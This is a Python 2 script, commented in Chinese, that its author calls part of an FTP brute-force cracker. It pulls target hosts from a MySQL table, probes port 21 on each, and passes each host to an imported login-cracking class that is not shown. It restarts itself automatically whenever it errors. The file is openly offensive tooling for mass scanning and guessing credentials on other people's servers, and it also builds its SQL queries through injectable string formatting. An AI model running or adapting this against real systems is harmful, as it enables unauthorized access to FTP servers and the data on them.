#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
# python FTP暴力破解部分代码
#  刚学写的不好请大家见谅
####################################################################
import mysql #数据库操作文件
import time #获取时间和延时
from ftplib import FTP    #FTP操作
import atexit  #用于文件重启
import sys
import os
####################################################################
def www_port(www):  #查看IP在查看端口
    try:
        ftpA = FTP()  #初始化FTP类
        ftpA.connect(www,"21")  #连接 服务器名  端口号
        sql_up(www,"send") #SQL修改数据
        #print "---------------------------"
        ftp_cracker = CFTP.PythonFtpScanner()  #初始化类
        ftp_cracker.ftp_login(www)  #传入要扫描的域名
    except Exception, e:
        print www,u"服务器FTP21端口可能没有开放"
        sql_up(www,"====") #SQL修改数据
        sql_sel() #SQL查询
        return
####################################################################
def sql_up(url,data): #SQL修改数据
    try:
        up = "update  url set  ftpsend='%s' where url='%s'"%(data,url)
        if mysql.mysql_update(up):  #修改数据
            print url,u"修改数据库成功"
        else:
            print url,u"修改数据库失败"
        mysql.mysql_S()  #保存数据
    except:
        return 0

def sql_sel(): #SQL查询
    try:
        sql="select * from url where ftpsend is NULL limit 1"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            www_port(row[0])  #www转换IP在查看端口
            #print row[0]
            time.sleep(3)  #延时
    except:
        print u"读取URL异常！！！！！"
        print u"3秒后,程序将结束重启..."
        mysql.mysql_S()  #保存数据
        mysql.mysql_close()  #关闭数据库
        atexit.register(close)#自动重启本程序

def close():  #自动重启本程序
    try:
        time.sleep(3)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        sys.exit(0)  #结束进程
####################################################################
import CFTP
if __name__=='__main__':
    import sys
    import socket
    socket.setdefaulttimeout(10)  #设置了全局默认超时时间ftp_cracker = PythonFtpScanner()  #初始化类
    try:
        mysql.mysql_open()  #连接数据库
        sql_sel() #SQL查询
    except:
        atexit.register(close)#自动重启本程序
